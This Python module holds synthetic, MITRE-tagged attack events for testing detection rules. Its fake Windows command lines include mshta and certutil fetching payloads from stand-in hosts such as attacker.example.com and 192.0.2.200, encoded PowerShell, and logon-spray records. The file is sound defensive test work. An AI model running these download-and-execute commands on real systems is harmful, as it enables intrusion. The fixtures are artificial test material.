"""Pre-recorded MITRE-tagged simulation scenarios for detection validation (#118).

All scenarios use deterministic, fully synthetic event payloads — no random
values, no ``time.time()``.  Event field names match the Windows process_creation
logsource dialect that the ``windows_baseline`` Sigma pack rules use (``Image``,
``CommandLine``, ``EventID``, ``LogonType``).

Catalogue
---------
scenario_encoded_powershell()
    T1059.001 — PowerShell with ``-EncodedCommand``.
    Expected to fire the ``encoded_powershell`` rule.

scenario_mshta_remote()
    T1218.005 — mshta.exe executing a remote HTA URL.
    Expected to fire the ``mshta_remote_script`` rule.

scenario_certutil_download()
    T1105 — certutil.exe abused as a LOLBin downloader (urlcache + HTTP URL).
    Expected to fire the ``certutil_remote_download`` rule.

scenario_failed_logon_spray()
    T1110.003 — failed network logon events (EventID 4625, LogonType 3).
    Expected to fire the ``failed_logon_spray`` rule.

scenario_benign_powershell()
    T1059.001 — benign PowerShell (no -enc flag).
    expected_to_fire=False — planted to verify no false positive.

All rule IDs reference the stable Sigma rule ``id`` field from the
``windows_baseline`` YAML files.
"""

from __future__ import annotations

from btagent_shared.types.detection_validation import (
    SimulatedAttackEvent,
    SimulationScenario,
)

# Stable Sigma rule IDs from windows_baseline/rules/*.yml
_RULE_ID_ENCODED_PS = "5b1f3a0e-9c4d-4f3a-8b6e-2d9c7e1a4f01"
_RULE_ID_CERTUTIL = "5b1f3a0e-9c4d-4f3a-8b6e-2d9c7e1a4f02"
_RULE_ID_MSHTA = "5b1f3a0e-9c4d-4f3a-8b6e-2d9c7e1a4f03"
_RULE_ID_LOGON_SPRAY = "5b1f3a0e-9c4d-4f3a-8b6e-2d9c7e1a4f04"


def scenario_encoded_powershell() -> SimulationScenario:
    """T1059.001 — Encoded PowerShell (should fire)."""
    return SimulationScenario(
        id="sim_encoded_powershell_001",
        name="Encoded PowerShell Command Execution",
        description=(
            "Simulates a threat actor running a base64-encoded PowerShell payload, "
            "a staple of staged loaders and post-exploitation frameworks (T1059.001)."
        ),
        technique_ids=["T1059.001"],
        events=[
            SimulatedAttackEvent(
                event_id="sim_enc_ps_evt_001",
                technique_id="T1059.001",
                source_event_dict={
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "CommandLine": (
                        "powershell.exe -EncodedCommand "
                        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
                    ),
                    "ParentImage": r"C:\Windows\System32\cmd.exe",
                    "User": "CORP\\attacker",
                    "host": "WS-VICTIM-001",
                    "ProcessId": "4812",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_ENCODED_PS,
            ),
            SimulatedAttackEvent(
                event_id="sim_enc_ps_evt_002",
                technique_id="T1059.001",
                source_event_dict={
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "CommandLine": "powershell.exe -enc JABzAD0AIgBIAGUAbABsAG8AIgA=",
                    "ParentImage": r"C:\Windows\explorer.exe",
                    "User": "CORP\\jsmith",
                    "host": "WS-VICTIM-002",
                    "ProcessId": "2048",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_ENCODED_PS,
            ),
            # Plant a benign encoded-command to exercise the false-positive path.
            # pwsh.exe on a CI runner — same binary, same flag, legitimate use.
            SimulatedAttackEvent(
                event_id="sim_enc_ps_evt_003_ci_false_positive",
                technique_id="T1059.001",
                source_event_dict={
                    "Image": r"C:\Program Files\PowerShell\7\pwsh.exe",
                    "CommandLine": (
                        "pwsh.exe -EncodedCommand JABwAGEAdABoACAAPQAgACIAQwA6AFwAYgB1AGkAbABkACIA"
                    ),
                    "ParentImage": r"C:\Windows\System32\services.exe",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "host": "BUILD-AGENT-001",
                    "ProcessId": "1234",
                },
                # Still expected_to_fire=True: the Sigma rule fires on pwsh.exe too.
                # This is intentional — a true positive; the analyst decides FP/TP.
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_ENCODED_PS,
            ),
        ],
    )


def scenario_mshta_remote() -> SimulationScenario:
    """T1218.005 — mshta.exe executing a remote HTA URL (should fire)."""
    return SimulationScenario(
        id="sim_mshta_remote_001",
        name="Mshta Remote HTA Execution",
        description=(
            "Simulates a threat actor using mshta.exe to execute an attacker-hosted "
            "HTA payload via HTTP, a signed-binary proxy-execution technique (T1218.005)."
        ),
        technique_ids=["T1218.005"],
        events=[
            SimulatedAttackEvent(
                event_id="sim_mshta_evt_001",
                technique_id="T1218.005",
                source_event_dict={
                    "Image": r"C:\Windows\System32\mshta.exe",
                    "CommandLine": "mshta.exe http://192.0.2.100/payload.hta",
                    "ParentImage": r"C:\Windows\System32\cmd.exe",
                    "User": "CORP\\victim",
                    "host": "WS-VICTIM-003",
                    "ProcessId": "7744",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_MSHTA,
            ),
            SimulatedAttackEvent(
                event_id="sim_mshta_evt_002_https",
                technique_id="T1218.005",
                source_event_dict={
                    "Image": r"C:\Windows\SysWOW64\mshta.exe",
                    "CommandLine": "mshta.exe https://attacker.example.com/stage2.hta",
                    "ParentImage": r"C:\Windows\System32\wscript.exe",
                    "User": "CORP\\jdoe",
                    "host": "WS-VICTIM-004",
                    "ProcessId": "5120",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_MSHTA,
            ),
            SimulatedAttackEvent(
                event_id="sim_mshta_evt_003_vbscript",
                technique_id="T1218.005",
                source_event_dict={
                    "Image": r"C:\Windows\System32\mshta.exe",
                    "CommandLine": r"mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"cmd /c whoami\"\")\"))",
                    "ParentImage": r"C:\Windows\System32\winlogon.exe",
                    "User": "CORP\\attacker",
                    "host": "WS-VICTIM-005",
                    "ProcessId": "9988",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_MSHTA,
            ),
        ],
    )


def scenario_certutil_download() -> SimulationScenario:
    """T1105 — certutil LOLBin downloader (should fire)."""
    return SimulationScenario(
        id="sim_certutil_download_001",
        name="Certutil Remote File Download",
        description=(
            "Simulates a threat actor using certutil.exe with urlcache or verifyctl "
            "flags to download a remote payload — a classic LOLBin downloader (T1105)."
        ),
        technique_ids=["T1105"],
        events=[
            SimulatedAttackEvent(
                event_id="sim_certutil_evt_001",
                technique_id="T1105",
                source_event_dict={
                    "Image": r"C:\Windows\System32\certutil.exe",
                    "CommandLine": (
                        "certutil.exe -urlcache -split -f "
                        "http://192.0.2.200/malware.exe C:\\Users\\Public\\malware.exe"
                    ),
                    "ParentImage": r"C:\Windows\System32\cmd.exe",
                    "User": "CORP\\victim",
                    "host": "WS-VICTIM-006",
                    "ProcessId": "3344",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_CERTUTIL,
            ),
            SimulatedAttackEvent(
                event_id="sim_certutil_evt_002_verifyctl",
                technique_id="T1105",
                source_event_dict={
                    "Image": r"C:\Windows\SysWOW64\certutil.exe",
                    "CommandLine": (
                        "certutil -verifyctl -split -f http://attacker.example.com/loader.bin"
                    ),
                    "ParentImage": r"C:\Windows\System32\powershell.exe",
                    "User": "CORP\\service_acct",
                    "host": "SRV-VICTIM-001",
                    "ProcessId": "8800",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_CERTUTIL,
            ),
        ],
    )


def scenario_failed_logon_spray() -> SimulationScenario:
    """T1110.003 — failed network logon spray candidates (should fire)."""
    return SimulationScenario(
        id="sim_failed_logon_spray_001",
        name="Failed Network Logon Spray Candidates",
        description=(
            "Simulates failed network logon events (EventID 4625, LogonType 3) "
            "that are the raw material for password-spray triage (T1110.003)."
        ),
        technique_ids=["T1110.003"],
        events=[
            SimulatedAttackEvent(
                event_id="sim_logon_evt_001",
                technique_id="T1110.003",
                source_event_dict={
                    "EventID": 4625,
                    "LogonType": 3,
                    "TargetUserName": "administrator",
                    "IpAddress": "198.51.100.1",
                    "WorkstationName": "ATTACKER-WS",
                    "host": "DC-VICTIM-001",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_LOGON_SPRAY,
            ),
            SimulatedAttackEvent(
                event_id="sim_logon_evt_002",
                technique_id="T1110.003",
                source_event_dict={
                    "EventID": 4625,
                    "LogonType": 3,
                    "TargetUserName": "jsmith",
                    "IpAddress": "198.51.100.1",
                    "WorkstationName": "ATTACKER-WS",
                    "host": "DC-VICTIM-001",
                },
                expected_to_fire=True,
                expected_rule_id=_RULE_ID_LOGON_SPRAY,
            ),
        ],
    )


def scenario_benign_powershell_no_enc() -> SimulationScenario:
    """T1059.001 — benign PowerShell without -enc (expected_to_fire=False).

    Planted to verify the Sigma rule does NOT fire on plain PowerShell
    invocations — a gap/false-negative guard for the certutil rule.
    Because expected_to_fire=False the coverage engine counts this as
    'not_expected' rather than 'missed', and the technique will appear in
    coverage_by_technique but with missed=0.
    """
    return SimulationScenario(
        id="sim_benign_ps_001",
        name="Benign PowerShell (No Encoded Command)",
        description=(
            "Benign PowerShell invocation without -enc/-EncodedCommand. "
            "expected_to_fire=False: verifies the encoded_powershell rule "
            "is not a catchall for all powershell.exe launches."
        ),
        technique_ids=["T1059.001"],
        events=[
            SimulatedAttackEvent(
                event_id="sim_benign_ps_evt_001",
                technique_id="T1059.001",
                source_event_dict={
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "CommandLine": 'powershell.exe -Command "Get-Service"',
                    "ParentImage": r"C:\Windows\System32\services.exe",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "host": "WS-CLEAN-001",
                    "ProcessId": "512",
                },
                expected_to_fire=False,
                expected_rule_id=None,
            ),
        ],
    )


def all_scenarios() -> list[SimulationScenario]:
    """Return all shipped simulation scenarios in a stable, deterministic order."""
    return [
        scenario_encoded_powershell(),
        scenario_mshta_remote(),
        scenario_certutil_download(),
        scenario_failed_logon_spray(),
        scenario_benign_powershell_no_enc(),
    ]
